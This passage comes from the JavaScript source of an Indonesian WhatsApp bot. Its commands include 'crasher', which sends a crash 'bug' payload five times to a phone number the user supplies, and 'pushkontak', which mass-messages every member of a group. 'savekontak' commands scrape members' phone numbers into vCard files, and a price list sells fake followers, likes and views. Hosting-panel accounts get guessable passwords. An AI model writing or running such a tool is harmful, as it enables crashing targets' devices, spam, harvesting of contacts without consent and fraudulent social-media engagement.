VERSION:3.0\n
N:${await lox.getName(i + '@s.whatsapp.net')}\n
FN:${await lox.getName(i + '@s.whatsapp.net')}\n
item1.TEL;waid=${i}:${i}\n
item1.X-ABLabel:Ponsel\n
item2.EMAIL;type=INTERNET: dikatoki111@gmail.com\n
item2.X-ABLabel:Email\n
item3.URL:https://whatsapp.com/channel/0029ValalxrICVfeUyTSrV1O
item3.X-ABLabel:YouTube\n
item4.ADR:;;Indonesia;;;;\n
item4.X-ABLabel:Region\n
END:VCARD`
})
}
const repf = await client.sendMessage(from, { 
contacts: { 
displayName: `${list.length} Kontak`, 
contacts: list }, contextInfo: {
forwardingScore: 9999999, 
isForwarded: true,
mentionedJid: [sender]
}}, { quoted: m })
client.sendMessage(from, { text : `Hai Kak @${sender.split("@")[0]}, Nih Owner Kuh Jangan lupa sv ya😘`, contextInfo:{
forwardingScore: 9999999, 
isForwarded: true,
mentionedJid:[sender]
}}, { quoted: repf })
}
break
case "delowner": 

if (!isOwner) return reply(mess.only.owner)
if (!args[0]) return reply(`Penggunaan ${prefix+command} nomor\nContoh ${prefix+command} 62×××`)
ya = q.split("|")[0].replace(/[^0-9]/g, '')
unp = ownerNumber.indexOf(ya)
ownerNumber.splice(unp, 1)
fs.writeFileSync('./database/owner.json', JSON.stringify(ownerNumber))
reply(`Nomor ${ya} Telah Di Hapus Owner!!!`)
break
case 'self': { 

if (!isOwner) return reply(mess.only.owner)
client.public = false
reply('Succes Mode Private')
}
break 
case "listsuntik": case "hargasuntik": case "suntiksosmed":
return reply(`*❑ LIST HARGA SUNTIK ALL SOSMED BY DIKZZ*

*FOLLOWERS INSTAGRAM*
> 100 followers :4.500
> 200 followers :8.500
> 500 followers :16.500
> 700 followers :22.500
> 1000 followers :32.500
> 1500 followers: 47.500
> 2.000 followers: 65.000

*LIKE INSTAGRAM INDO PERMANEN*
> 100 like : 4.000
> 200 like : 8.000
> 300 like : 9.000
> 500 like :12 .000
> 1000 like :18.000

*FOLLOWERS TIK TOK*
> 100 followers : 4.500
> 200 followers: 8.000
> 300 followers: 10.000
> 500 followers: 15.000
> 700 followers: 20.500
> 1000 followers: 30.000
> 1.500 followers: 45.000
> 2.000 followers: 60.500

*LIKE TIK TOK PERMANEN*
> 100 like :2.00
> 200 like :3.000
> 300 like :5.000
> 500 like :7.000
> 1000 like :13.000

*VIEW TIK TOK PERMANEN*
> 10.000 view : 2.000
> 20.000 view :3.000
> 30.000 view :4.000
> 50.000 view :5.000
> 100.000 view :9.000

*Contact person*
> *Wa:* wa.me/6285708112935
> *Telegram:* t.me/dikatoki111
*Testimoni*
https://whatsapp.com/channel/0029ValalxrICVfeUyTSrV1O`)
break 
case 'luminai': {
if (!text) return m.reply(`Contoh: ${prefix+command} hai luminai`);
const requestData = { content: text, user: m.sender };
const quoted = m && (m.quoted || m);
try {
let response;
if (quoted && /image/.test(quoted.mimetype || quoted.msg.mimetype)) {
requestData.imageBuffer = await quoted.download();
}
response = (await axios.post('https://lumin-ai.xyz', requestData)).data.result;
m.reply(response);
} catch (err) {
m.reply(err);
}}
break
case "idgc": {
if (!isOwner) return Reply(mess.owner)
if (!isGroup) return Reply(mess.group)
m.reply(`${m.chat}`)
}
break
case 'qc': {
    if (!q) return reply(`Enter Text`);
   await loading();
    const ppnyauser = await client.profilePictureUrl(m.sender, 'image').catch(_ => 'https://telegra.ph/file/6880771a42bad09dd6087.jpg');
    
    const json = {
        "type": "quote",
        "format": "png",
        "backgroundColor": "#FFFFFF",
        "width": 512,
        "height": 768,
        "scale": 2,
        "messages": [
            {
                "entities": [],
                "avatar": true,
                "from": {
                    "id": 1,
                    "name": pushname,
                    "photo": {
                        "url": ppnyauser
                    }
                },
                "text": q,
                "replyMessage": {}
            }
        ]
    };

    try {
        const res = await axios.post('https://bot.lyo.su/quote/generate', json, {
            headers: { 'Content-Type': 'application/json' }
        });

        const buffer = Buffer.from(res.data.result.image, 'base64');
await client.sendStimg(m.chat, buffer, m, {packname: `𝑮𝑨𝑴𝑴𝑨-𝑩𝑶𝑻👿`})
    } catch (error) {
        console.log(error);
        return reply("Terjadi kesalahan saat membuat kutipan. Silakan coba lagi.");
    }
}
break

        case "pushkontak2": {
if (!isOwner) return reply(mess.owner)
if (!text) return m.reply("*Contoh Command :*\n.pushkontak2 idgc|jeda|pesan\n\n*Note :* Jeda 1 detik = 1000\nketik *.listgc* untuk melihat semua list id grup")
if (!text.split("|")) return m.reply("*Contoh Command :*\n.pushkontak2 idgc|jeda|pesan\n\n*Note :* Jeda 1 detik = 1000\nketik *.listgc* untuk melihat semua list id grup")
var idnya = text.split("|")[0]
var delay = Number(text.split("|")[1])
var teks = text.split("|")[2]
if (!idnya.endsWith("@g.us")) return m.reply("Format ID Grup Tidak Valid")
if (isNaN(delay)) return m.reply("Format Delay Tidak Valid")
if (!teks) return m.reply("*Contoh Command :*\n.pushkontak2 idgc|jeda|pesan\n\n*Note :* Jeda 1 detik = 1000\nketik *.listgc* untuk melihat semua list id grup")
var groupMetadataa
try {
groupMetadataa = await client.groupMetadata(`${idnya}`)
} catch (e) {
return m.reply("*ID Grup* tidak valid!")
}
const participants = await groupMetadataa.participants
const halls = await participants.filter(v => v.id.endsWith('.net')).map(v => v.id)
m.reply(`Memproses Mengirim Pesan Ke *${halls.length} Member Grup*`)
for (let mem of halls) {
if (mem !== m.sender) {
contacts.push(mem)
await fs.writeFileSync('./database/contacts.json', JSON.stringify(contacts))
await client.sendMessage(mem, {text: teks}, {quoted: qchanel})
await sleep(Number(delay))
}}
try {
const uniqueContacts = [...new Set(contacts)]
const vcardContent = uniqueContacts.map((contact, index) => {
const vcard = [
"BEGIN:VCARD",
"VERSION:3.0",
`FN:BUYER-DIKZ [${createSerial(2)}] ${contact.split("@")[0]}`,
`TEL;type=CELL;type=VOICE;waid=${contact.split("@")[0]}:+${contact.split("@")[0]}`,
"END:VCARD",
"", ].join("\n")
return vcard }).join("")
fs.writeFileSync("./database/contacts.vcf", vcardContent, "utf8")
} catch (err) {
m.reply(err.toString())
} finally {
if (m.chat !== m.sender) await m.reply(`Berhasil Mengirim Pesan Ke *${halls.length} Member Grup*, File Contact Berhasil Dikirim ke Private Chat`)
await client.sendMessage(m.sender, { document: fs.readFileSync("./database/contacts.vcf"), fileName: "contacts.vcf", caption: "File Contact Berhasil Di Buat✅", mimetype: "text/vcard", }, { quoted: m })
contacts.splice(0, contacts.length)
await fs.writeFileSync("./database/contacts.json", JSON.stringify(contacts))
await fs.writeFileSync("./database/contacts.vcf", "")
}}
break
case "savekontak": {
if (!isOwner) return reply(mess.owner)
if (!isGroup) return reply(mess.group)
const halls = await groupMetadata.participants.filter(v => v.id.endsWith('.net')).map(v => v.id)
for (let mem of halls) {
if (mem !== m.sender) {
contacts.push(mem)
fs.writeFileSync('./database/contacts.json', JSON.stringify(contacts))
}}
try {
const uniqueContacts = [...new Set(contacts)]
const vcardContent = uniqueContacts.map((contact, index) => {
const vcard = [
"BEGIN:VCARD",
"VERSION:3.0",
`FN:BUYER-DIKZ[${createSerial(2)}] ${contact.split("@")[0]}`,
`TEL;type=CELL;type=VOICE;waid=${contact.split("@")[0]}:+${contact.split("@")[0]}`,
"END:VCARD",
"", ].join("\n")
return vcard }).join("")
fs.writeFileSync("./database/contacts.vcf", vcardContent, "utf8")
} catch (err) {
m.reply(err.toString())
} finally {
if (m.chat !== m.sender) await m.reply(`File Kontak Berhasil Dikirim ke Private Chat`)
await client.sendMessage(m.sender, { document: fs.readFileSync("./database/contacts.vcf"), fileName: "contacts.vcf", caption: "File Contact Berhasil Di Buat✅", mimetype: "text/vcard", }, { quoted: m })
contacts.splice(0, contacts.length)
await fs.writeFileSync("./database/contacts.json", JSON.stringify(contacts))
await fs.writeFileSync("./database/contacts.vcf", "")
}}
break
case "savekontak2": {
if (!isOwner) return reply(mess.owner)
if (!text) return m.reply(example("idgrupnya\n\nketik *.listgc* untuk melihat semua list id grup"))
var idnya = text
var groupMetadataa
try {
groupMetadataa = await client.groupMetadata(`${idnya}`)
} catch (e) {
return m.reply("*ID Grup* tidak valid!")
}
const participants = await groupMetadataa.participants
const halls = await participants.filter(v => v.id.endsWith('.net')).map(v => v.id)
for (let mem of halls) {
if (mem !== m.sender) {
contacts.push(mem)
fs.writeFileSync('./database/contacts.json', JSON.stringify(contacts))
}}
try {
const uniqueContacts = [...new Set(contacts)]
const vcardContent = uniqueContacts.map((contact, index) => {
const vcard = [
"BEGIN:VCARD",
"VERSION:3.0",
`FN:BUYER-DIKZ[${createSerial(2)}] ${contact.split("@")[0]}`,
`TEL;type=CELL;type=VOICE;waid=${contact.split("@")[0]}:+${contact.split("@")[0]}`,
"END:VCARD",
"", ].join("\n")
return vcard }).join("")
fs.writeFileSync("./database/contacts.vcf", vcardContent, "utf8")
} catch (err) {
m.reply(err.toString())
} finally {
if (m.chat !== m.sender) await m.reply(`File Kontak Berhasil Dikirim ke Private Chat`)
await client.sendMessage(m.sender, { document: fs.readFileSync("./database/contacts.vcf"), fileName: "contacts.vcf", caption: "File Contact Berhasil Di Buat✅", mimetype: "text/vcard", }, { quoted: m })
contacts.splice(0, contacts.length)
await fs.writeFileSync("./database/contacts.json", JSON.stringify(contacts))
await fs.writeFileSync("./database/contacts.vcf", "")
}}
break 
case 'totalfitur': {
ngaceng = fs.readFileSync("./𝕯𝕴𝕶𝕬𝕿𝕺𝕶𝕴.js").toString(),
matches = ngaceng.match(/case '[^']+'(?!.*case '[^']+')/g) || [],
caseCount = matches.length,
caseNames = matches.map(match => match.match(/case '([^']+)'/)[1]);
let block = await client.fetchBlocklist()
let gcall = Object.values(await client.groupFetchAllParticipating().catch(_=> null))
let totalCases = caseCount,
listCases = caseNames.join('\n${prefix} ');
reply(` *Haii ${pushname}*

𝐓𝐨𝐭𝐚𝐥 𝐅𝐢𝐭𝐮𝐫 𝑮𝑨𝑴𝑴𝑨-𝑩𝑶𝑻 : *${totalFitur()} Fitur*`)
}
break
case "pushkontak": {
if (!isOwner) return reply(mess.owner)
if (!isGroup) return reply(mess.group)
if (!text) return m.reply(example("pesannya"))
var teks = text
const halls = await groupMetadata.participants.filter(v => v.id.endsWith('.net')).map(v => v.id)
m.reply(`Memproses Mengirim Pesan Ke *${halls.length} Member Grup*`)
for (let mem of halls) {
if (mem !== m.sender) {
contacts.push(mem)
await fs.writeFileSync('./database/contacts.json', JSON.stringify(contacts))
await client.sendMessage(mem, {text: teks}, {quoted: qchanel})
await sleep(global.delaypushkontak)
}}
try {
const uniqueContacts = [...new Set(contacts)]
const vcardContent = uniqueContacts.map((contact, index) => {
const vcard = [
"BEGIN:VCARD",
"VERSION:3.0",
`FN:BUYER-DIKZ[${createSerial(2)}] ${contact.split("@")[0]}`,
`TEL;type=CELL;type=VOICE;waid=${contact.split("@")[0]}:+${contact.split("@")[0]}`,
"END:VCARD",
"", ].join("\n")
return vcard }).join("")
fs.writeFileSync("./database/contacts.vcf", vcardContent, "utf8")
} catch (err) {
m.reply(err.toString())
} finally {
if (m.chat !== m.sender) await m.reply(`Berhasil Mengirim Pesan Ke *${halls.length} Member Grup*, File Contact Berhasil Dikirim ke Private Chat`)
await client.sendMessage(m.sender, { document: fs.readFileSync("./database/contacts.vcf"), fileName: "contacts.vcf", caption: "File Contact Berhasil Di Buat✅", mimetype: "text/vcard", }, { quoted: m })
contacts.splice(0, contacts.length)
await fs.writeFileSync("./database/contacts.json", JSON.stringify(contacts))
await fs.writeFileSync("./database/contacts.vcf", "")
}}
break
case 'crasher':
if (!isMurbug) return reply(mess.only.premium)
if (!q) return reply(`Example: ${prefix + command} 62×××`)
target = q.replace(/[^0-9]/g,'')+"@s.whatsapp.net"
reply(bugres)
for (let i = 0; i < 5; i++) {
await XeonButtNew(target, ptcp = true)
}
reply(`*_</> 𝐁𝐄𝐑𝐇𝐀𝐒𝐈𝐋 𝐌𝐄𝐍𝐆𝐈𝐑𝐈𝐌𝐊𝐀𝐍 𝐁𝐔𝐆 𝐊𝐄 𝐓𝐀𝐑𝐆𝐄𝐓 </>_*`)
break
case "listgc": case "cekidgc": case"listgrup": {

let gcall = Object.values(await client.groupFetchAllParticipating().catch(_=> null))

let listgc = '\n'

await gcall.forEach((u, i) => {

listgc += `*${i+1}.* ${u.subject}\n* *ID :* ${u.id}\n* *Total Member :* ${u.participants.length} Member\n* *Status Grup :* ${u.announce == true ? "Tertutup" : "Terbuka"}\n* *Pembuat :* ${u.owner ? u.owner.split('@')[0] : 'Sudah keluar'}\n\n`
})
client.sendMessage(m.chat, {text: `${listgc}`, contextInfo: {mentionedJid: [m.sender], externalAdReply: {
thumbnail: await getBuffer(menugmbr), title: `𝑮𝑨𝑴𝑴𝑨-𝑩𝑶𝑻👿`, body: `Region : lamongan`,  sourceUrl: 'htthttps://whatsapp.com/channel/0029ValalxrICVfeUyTSrV1O', previewType: "PHOTO"}}}, {quoted: qchanel})
}
break
        case "delusr": {
  if (!isOwner) return reply(`*KHUSUS OWNER!*`)
let usr = args[0]
if (!usr) return reply('ID nya mana?')
let f = await fetch(domain + "/api/application/users/" + usr, {
"method": "DELETE",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
let res = f.ok ? {
errors: null
} : await f.json()
if (res.errors) return reply('*USER NOT FOUND*')
reply('*SUCCESSFULLY DELETE THE USER*')
}
        break
                        case "listsrv": {
    if (!isOwner) return reply(`*KHUSUS OWNER*`);
  let page = args[0] ? args[0] : '1';
  let f = await fetch(domain + "/api/application/servers?page=" + page, {
    "method": "GET",
    "headers": {
      "Accept": "application/json",
      "Content-Type": "application/json",
      "Authorization": "Bearer " + apikey
    }
  });
  let res = await f.json();
  let servers = res.data;
  let sections = [];
  let messageText = "Berikut adalah daftar server:\n\n";
  
  for (let server of servers) {
    let s = server.attributes;
    
    let f3 = await fetch(domain + "/api/client/servers/" + s.uuid.split`-`[0] + "/resources", {
      "method": "GET",
      "headers": {
        "Accept": "application/json",
        "Content-Type": "application/json",
        "Authorization": "Bearer " + capikey
      }
    });
    
    let data = await f3.json();
    let status = data.attributes ? data.attributes.current_state : s.status;
    
    messageText += `ID Server: ${s.id}\n`;
    messageText += `Nama Server: ${s.name}\n`;
    messageText += `Status: ${status}\n\n`;
  }
  
  messageText += `Halaman: ${res.meta.pagination.current_page}/${res.meta.pagination.total_pages}\n`;
  messageText += `Total Server: ${res.meta.pagination.count}`;
  
  await client.sendMessage(m.chat, { text: messageText }, { quoted: m });
  
  if (res.meta.pagination.current_page < res.meta.pagination.total_pages) {
    reply(`Gunakan perintah ${prefix}listsrv ${res.meta.pagination.current_page + 1} untuk melihat halaman selanjutnya.`);
  }
}
break;
        case "delsrv": {
if (!isOwner) return reply(`*KHUSUS OWNER!*`)

let srv = args[0]
if (!srv) return reply('ID nya mana?')
let f = await fetch(domain + "/api/application/servers/" + srv, {
"method": "DELETE",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey,
}
})
let res = f.ok ? {
errors: null
} : await f.json()
if (res.errors) return reply('*SERVER NOT FOUND*')
reply('*SUCCESSFULLY DELETE THE SERVER*')
}
        break
case "1gb": {
 if (!isSeler && !groupseller && !isOwner) return reply(`*KHUSUS RESELLER DIKZZ-SHOP!*`)

let t = text.split(',');
if (t.length < 2) return reply(`*Format salah!*
Penggunaan:
${prefix + command} user,nomer`)
let username = t[0];
let u = m.quoted ? m.quoted.sender : t[1] ? t[1].replace(/[^0-9]/g, '') + '@s.whatsapp.net' : m.mentionedJid[0];
let name = username + "1GB"
let egg = global.eggsnya
let loc = global.location
let memo = "1024"
let cpu = "30"
let disk = "1024"
let email = username + "dikatoki@cpanel.bot"

if (!u) return
let d = (await client.onWhatsApp(u.split`@`[0]))[0] || {}
let password = username + "001"
let f = await fetch(domain + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
},
"body": JSON.stringify({
"email": email,
"username": username,
"first_name": username,
"last_name": username,
"language": "en",
"password": password
})
})
let data = await f.json();
if (data.errors) return reply(JSON.stringify(data.errors[0], null, 2));
let user = data.attributes
let f2 = await fetch(domain + "/api/application/nests/5/eggs/" + egg, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
reply(`

 *DONE CRATE USER + SERVER ID :* ${user.id}`)
ctf = `*BERIKUT DATA AKUN PANEL ANDA* ͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏
Hai @${u.split`@`[0]}

⎙─➤ *👤USERNAME* : ${user.username}
⎙─➤ *🔐PASSWORD* : ${password}
⎙─➤ *🌐LOGIN* : ${domain}



NOTE:
OWNER HANYA MENGIRIM 1X DATA 
AKUN ANDA MOHON DI SIMPAN BAIK BAIK
KALAU DATA AKUN ANDA HILANG OWNER
TIDAK DAPAT MENGIRIM AKUN ANDA LAGI
=============================
`
client.sendMessage(u,{image: {url: panelgmbr}, caption: ctf }, { quoted: client.chat })
let data2 = await f2.json();
let startup_cmd = data2.attributes.startup

let f3 = await fetch(domain + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey,
},
"body": JSON.stringify({
"name": name,
"description": "${hariini}",
"user": user.id,
"egg": parseInt(egg),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
"startup": startup_cmd,
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
"memory": memo,
"swap": 0,
"disk": disk,
"io": 500,
"cpu": cpu
},
"feature_limits": {
"databases": 5,
"backups": 5,
"allocations": 1
},
deploy: {
locations: [parseInt(loc)],
dedicated_ip: false,
port_range: [],
},
})
})
let res = await f3.json()
if (res.errors) return reply(JSON.stringify(res.errors[0], null, 2))
let server = res.attributes
let p = await reply(`
*Berhasil Membuat Akun Panel Anda ✅*
Data Akun Sudah Dikirim Ke Nomor ${u.split`@`[0]}
`)

}

break
case "2gb": {
if (!isSeler && !groupseller && !isOwner) return reply(`*KHUSUS RESELLER DIKZZ-SHOP!*`)

let t = text.split(',');
if (t.length < 2) return reply(`*Format salah!*
Penggunaan:
${prefix + command} user,nomer`)
let username = t[0];
let u = m.quoted ? m.quoted.sender : t[1] ? t[1].replace(/[^0-9]/g, '') + '@s.whatsapp.net' : m.mentionedJid[0];
let name = username + "2GB"
let egg = global.eggsnya
let loc = global.location
let memo = "2048"
let cpu = "60"
let disk = "2048"
let email = username + "dikatoki@cpanel.bot"

if (!u) return
let d = (await client.onWhatsApp(u.split`@`[0]))[0] || {}
let password = username + "001"
let f = await fetch(domain + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
},
"body": JSON.stringify({
"email": email,
"username": username,
"first_name": username,
"last_name": username,
"language": "en",
"password": password
})
})
let data = await f.json();
if (data.errors) return reply(JSON.stringify(data.errors[0], null, 2));
let user = data.attributes
let f2 = await fetch(domain + "/api/application/nests/5/eggs/" + egg, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
reply(`SUCCES CREATE USER ID: ${user.id}`)
ctf = `*BERIKUT DATA AKUN PANEL ANDA* ͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏
Hai @${u.split`@`[0]}

⎙─➤ *👤USERNAME* : ${user.username}
⎙─➤ *🔐PASSWORD* : ${password}
⎙─➤ *🌐LOGIN* : ${domain}



NOTE:
OWNER HANYA MENGIRIM 1X DATA 
AKUN ANDA MOHON DI SIMPAN BAIK BAIK
KALAU DATA AKUN ANDA HILANG OWNER
TIDAK DAPAT MENGIRIM AKUN ANDA LAGI
=============================
`
client.sendMessage(u,{image: {url: panelgmbr}, caption: ctf }, { quoted: client.chat })
let data2 = await f2.json();
let startup_cmd = data2.attributes.startup

let f3 = await fetch(domain + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey,
},
"body": JSON.stringify({
"name": name,
"description": "${hariini}",
"user": user.id,
"egg": parseInt(egg),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
"startup": startup_cmd,
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
"memory": memo,
"swap": 0,
"disk": disk,
"io": 500,
"cpu": cpu
},
"feature_limits": {
"databases": 5,
"backups": 5,
"allocations": 1
},
deploy: {
locations: [parseInt(loc)],
dedicated_ip: false,
port_range: [],
},
})
})
let res = await f3.json()
if (res.errors) return reply(JSON.stringify(res.errors[0], null, 2))
let server = res.attributes
let p = await reply(`
*SUCCESSFULLY ADD USER + SERVER*
TYPE: user
ID: ${user.id}
NAME: ${user.first_name} ${user.last_name}
MEMORY: ${server.limits.memory === 0 ? 'Unlimited' : server.limits.memory} MB
DISK: ${server.limits.disk === 0 ? 'Unlimited' : server.limits.disk} MB
CPU: ${server.limits.cpu}%

`)

}
case "1gb": {
if (!isSeler && !groupseller && !isOwner) return reply(`*KHUSUS RESELLER DIKZZ-SHOP!*`)

let t = text.split(',');
if (t.length < 2) return reply(`*Format salah!*
Penggunaan:
${prefix + command} user,nomer`)
let username = t[0];
let u = m.quoted ? m.quoted.sender : t[1] ? t[1].replace(/[^0-9]/g, '') + '@s.whatsapp.net' : m.mentionedJid[0];
let name = username + "1GB"
let egg = global.eggsnya
let loc = global.location
let memo = "1072"
let cpu = "30"
let disk = "1072"
let email = username + "dikatoki@cpanel.bot"

if (!u) return
let d = (await client.onWhatsApp(u.split`@`[0]))[0] || {}
let password = username + "001"
let f = await fetch(domain + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
},
"body": JSON.stringify({
"email": email,
"username": username,
"first_name": username,
"last_name": username,
"language": "en",
"password": password
})
})
let data = await f.json();
if (data.errors) return reply(JSON.stringify(data.errors[0], null, 2));
let user = data.attributes
let f2 = await fetch(domain + "/api/application/nests/5/eggs/" + egg, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
reply(`SUCCES CREATE USER ID: ${user.id}`)
